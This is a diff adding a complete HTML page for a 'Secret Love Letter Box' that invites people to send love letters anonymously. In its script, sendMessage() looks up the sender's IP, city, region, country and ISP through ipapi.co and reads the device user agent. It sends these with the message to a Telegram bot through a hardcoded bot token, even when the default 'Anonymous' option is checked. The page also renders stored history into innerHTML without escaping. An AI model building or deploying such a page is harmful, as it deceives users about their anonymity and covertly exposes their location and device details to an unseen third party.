@@ -1,0 +1,500 @@
+HTML
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>💌 Secret Love Letter Box 💌</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: 'Segoe UI', sans-serif;
+}
+
+body{
+    min-height:100vh;
+    background:
+    linear-gradient(rgba(0,0,0,.55),rgba(0,0,0,.65)),
+    url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?q=80&w=1920');
+    background-size:cover;
+    background-position:center;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    overflow:auto;
+    padding:20px;
+}
+
+.main-box{
+    width:100%;
+    max-width:850px;
+    border-radius:30px;
+    padding:25px;
+    background:rgba(0,0,0,.45);
+    backdrop-filter:blur(10px);
+    position:relative;
+    overflow:hidden;
+    border:3px solid transparent;
+    animation:rgbBorder 4s linear infinite;
+    box-shadow:0 0 40px rgba(255,0,150,.4);
+}
+
+@keyframes rgbBorder{
+    0%{border-color:#ff0080;}
+    25%{border-color:#00ffee;}
+    50%{border-color:#fffb00;}
+    75%{border-color:#8a2be2;}
+    100%{border-color:#ff0080;}
+}
+
+.top-bar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:25px;
+}
+
+.logo{
+    color:white;
+    font-size:30px;
+    font-weight:900;
+    text-shadow:0 0 15px hotpink;
+}
+
+.menu{
+    position:relative;
+}
+
+.menu-btn{
+    background:none;
+    border:none;
+    color:white;
+    font-size:35px;
+    cursor:pointer;
+}
+
+.dropdown{
+    position:absolute;
+    right:0;
+    top:45px;
+    background:#111;
+    border-radius:15px;
+    overflow:hidden;
+    display:none;
+    min-width:220px;
+    border:2px solid hotpink;
+    z-index:100;
+}
+
+.dropdown a{
+    display:block;
+    padding:14px;
+    text-decoration:none;
+    color:white;
+    font-weight:bold;
+    border-bottom:1px solid rgba(255,255,255,.1);
+}
+
+.dropdown a:hover{
+    background:#ff0080;
+}
+
+.title{
+    text-align:center;
+    color:white;
+    font-size:38px;
+    font-weight:900;
+    margin-bottom:10px;
+    text-shadow:0 0 18px #ff0080;
+}
+
+.subtitle{
+    text-align:center;
+    color:#fff;
+    font-size:18px;
+    margin-bottom:25px;
+    font-weight:bold;
+}
+
+.form-box{
+    display:flex;
+    flex-direction:column;
+    gap:18px;
+}
+
+.input-box{
+    width:100%;
+    padding:18px;
+    border:none;
+    outline:none;
+    border-radius:18px;
+    background:rgba(255,255,255,.12);
+    color:white;
+    font-size:18px;
+    font-weight:bold;
+    border:2px solid rgba(255,255,255,.15);
+    transition:.3s;
+}
+
+.input-box:focus{
+    border-color:#ff0080;
+    box-shadow:0 0 20px #ff0080;
+}
+
+textarea{
+    min-height:240px;
+    resize:none;
+}
+
+::placeholder{
+    color:#ddd;
+    font-weight:bold;
+}
+
+.option-box{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    color:white;
+    font-weight:bold;
+    font-size:17px;
+}
+
+.check{
+    width:22px;
+    height:22px;
+}
+
+.send-btn{
+    padding:18px;
+    border:none;
+    border-radius:18px;
+    font-size:22px;
+    font-weight:900;
+    cursor:pointer;
+    color:white;
+    background:linear-gradient(45deg,#ff0080,#00ffee,#fffb00,#8a2be2);
+    background-size:400% 400%;
+    animation:rgbBtn 4s ease infinite;
+    box-shadow:0 0 25px rgba(255,0,150,.5);
+    transition:.3s;
+}
+
+.send-btn:hover{
+    transform:scale(1.03);
+}
+
+@keyframes rgbBtn{
+    0%{background-position:0% 50%;}
+    50%{background-position:100% 50%;}
+    100%{background-position:0% 50%;}
+}
+
+.popup{
+    position:fixed;
+    top:25px;
+    right:25px;
+    padding:18px 25px;
+    border-radius:18px;
+    color:white;
+    font-size:18px;
+    font-weight:bold;
+    display:none;
+    z-index:9999;
+    animation:pop .4s ease;
+}
+
+.success{
+    background:#00c853;
+}
+
+.error{
+    background:#ff1744;
+}
+
+@keyframes pop{
+    from{
+        transform:translateY(-20px);
+        opacity:0;
+    }
+    to{
+        transform:translateY(0);
+        opacity:1;
+    }
+}
+
+.history-box{
+    display:none;
+    margin-top:25px;
+    background:rgba(255,255,255,.08);
+    padding:20px;
+    border-radius:20px;
+}
+
+.history-box h2{
+    color:white;
+    margin-bottom:15px;
+}
+
+.history-item{
+    background:rgba(0,0,0,.4);
+    padding:15px;
+    border-radius:15px;
+    margin-bottom:12px;
+    color:white;
+    border-left:5px solid hotpink;
+}
+
+.footer{
+    text-align:center;
+    color:white;
+    margin-top:20px;
+    font-size:16px;
+    font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="main-box">
+
+<div class="top-bar">
+<div class="logo">💌 Secret Letter 💌</div>
+
+<div class="menu">
+<button class="menu-btn" onclick="toggleMenu()">⋮</button>
+
+<div class="dropdown" id="dropdown">
+<a href="#" onclick="showHistory()">📜 Message History</a>
+<a href="#">💖 Love Inbox</a>
+<a href="#">🔒 Anonymous Mode</a>
+</div>
+</div>
+</div>
+
+<h1 class="title">💘 Send Your Secret Message 💘</h1>
+
+<p class="subtitle">
+Write a beautiful secret love letter anonymously or with your real identity ❤️
+</p>
+
+<div class="form-box">
+
+<input type="text" class="input-box" id="name" placeholder="👤 Enter Your Name">
+
+<input type="text" class="input-box" id="phone" placeholder="📱 Enter Phone Number">
+
+<input type="email" class="input-box" id="email" placeholder="📧 Enter Email Address">
+
+<textarea class="input-box" id="message" placeholder="💌 Write Your Secret Love Letter Here..."></textarea>
+
+<div class="option-box">
+<input type="checkbox" class="check" id="randomInfo" checked>
+<label for="randomInfo">
+🎭 Send With Random Anonymous Information
+</label>
+</div>
+
+<button class="send-btn" onclick="sendMessage()">
+💖 SEND SECRET MESSAGE 💖
+</button>
+
+</div>
+
+<div class="history-box" id="historyBox">
+<h2>📜 Message Receive History</h2>
+<div id="historyList"></div>
+</div>
+
+<div class="footer">
+❤️ Made With Love Letter Style RGB Design ❤️
+</div>
+
+</div>
+
+<div class="popup success" id="successPopup">
+✅ Message Sent Successfully!
+</div>
+
+<div class="popup error" id="errorPopup">
+❌ Failed To Send Message!
+</div>
+
+<script>
+
+const BOT_TOKEN = "8653934604:AAGE9O4iEkB62yxsXWEGOE2AS_TZNmmMxPA";
+const CHAT_ID = "6048050987";
+
+function toggleMenu(){
+    const menu = document.getElementById("dropdown");
+    menu.style.display = menu.style.display === "block" ? "none" : "block";
+}
+
+function saveCookie(name,value,days){
+    let expires = "";
+    if(days){
+        let date = new Date();
+        date.setTime(date.getTime()+(days*24*60*60*1000));
+        expires = "; expires="+date.toUTCString();
+    }
+    document.cookie = name+"="+(value||"")+expires+"; path=/";
+}
+
+function getCookie(name){
+    let nameEQ = name + "=";
+    let ca = document.cookie.split(';');
+    for(let i=0;i<ca.length;i++){
+        let c = ca[i];
+        while(c.charAt(0)==' ') c = c.substring(1,c.length);
+        if(c.indexOf(nameEQ)==0) return c.substring(nameEQ.length,c.length);
+    }
+    return null;
+}
+
+window.onload = function(){
+    document.getElementById("name").value = getCookie("name") || "";
+    document.getElementById("phone").value = getCookie("phone") || "";
+    document.getElementById("email").value = getCookie("email") || "";
+}
+
+async function getIPInfo(){
+    try{
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+    }catch{
+        return {};
+    }
+}
+
+function showPopup(type){
+    const popup = document.getElementById(type+"Popup");
+    popup.style.display = "block";
+
+    setTimeout(()=>{
+        popup.style.display = "none";
+    },3000);
+}
+
+function saveHistory(data){
+    let history = JSON.parse(localStorage.getItem("msgHistory")) || [];
+    history.unshift(data);
+    localStorage.setItem("msgHistory",JSON.stringify(history));
+}
+
+function showHistory(){
+    document.getElementById("historyBox").style.display = "block";
+
+    let history = JSON.parse(localStorage.getItem("msgHistory")) || [];
+    let html = "";
+
+    history.forEach(item=>{
+        html += `
+        <div class="history-item">
+        <b>👤 Name:</b> ${item.name}<br>
+        <b>💌 Message:</b> ${item.message}<br>
+        <b>🕒 Time:</b> ${item.time}
+        </div>
+        `;
+    });
+
+    document.getElementById("historyList").innerHTML = html || "No History Found";
+}
+
+async function sendMessage(){
+
+    let name = document.getElementById("name").value;
+    let phone = document.getElementById("phone").value;
+    let email = document.getElementById("email").value;
+    let message = document.getElementById("message").value;
+    let randomInfo = document.getElementById("randomInfo").checked;
+
+    if(message.trim() === ""){
+        showPopup("error");
+        return;
+    }
+
+    if(randomInfo){
+        name = "Anonymous User";
+        phone = "Hidden";
+        email = "anonymous@secret.com";
+    }
+
+    saveCookie("name",name,30);
+    saveCookie("phone",phone,30);
+    saveCookie("email",email,30);
+
+    const ipInfo = await getIPInfo();
+
+    const device = navigator.userAgent;
+
+    const text = `
+💌 NEW SECRET LOVE LETTER 💌
+
+━━━━━━━━━━━━━━
+👤 NAME: ${name}
+📱 PHONE: ${phone}
+📧 EMAIL: ${email}
+━━━━━━━━━━━━━━
+
+💌 MESSAGE:
+${message}
+
+━━━━━━━━━━━━━━
+🌍 IP: ${ipInfo.ip || "Unknown"}
+🏳️ COUNTRY: ${ipInfo.country_name || "Unknown"}
+📍 REGION: ${ipInfo.region || "Unknown"}
+🏙️ CITY: ${ipInfo.city || "Unknown"}
+📡 NETWORK: ${ipInfo.org || "Unknown"}
+🕒 TIME: ${new Date().toLocaleString()}
+
+📱 DEVICE INFO:
+${device}
+━━━━━━━━━━━━━━
+❤️ Secret Love Inbox ❤️
+`;
+
+    try{
+
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                chat_id:CHAT_ID,
+                text:text
+            })
+        });
+
+        const data = await response.json();
+
+        if(data.ok){
+
+            saveHistory({
+                name:name,
+                message:message,
+                time:new Date().toLocaleString()
+            });
+
+            showPopup("success");
+
+            document.getElementById("message").value = "";
+
+        }else{
+            showPopup("error");
+        }
+
+    }catch(err){
+        showPopup("error");
+    }
+
+}
+
+</script>
+
+</body>
+</html>
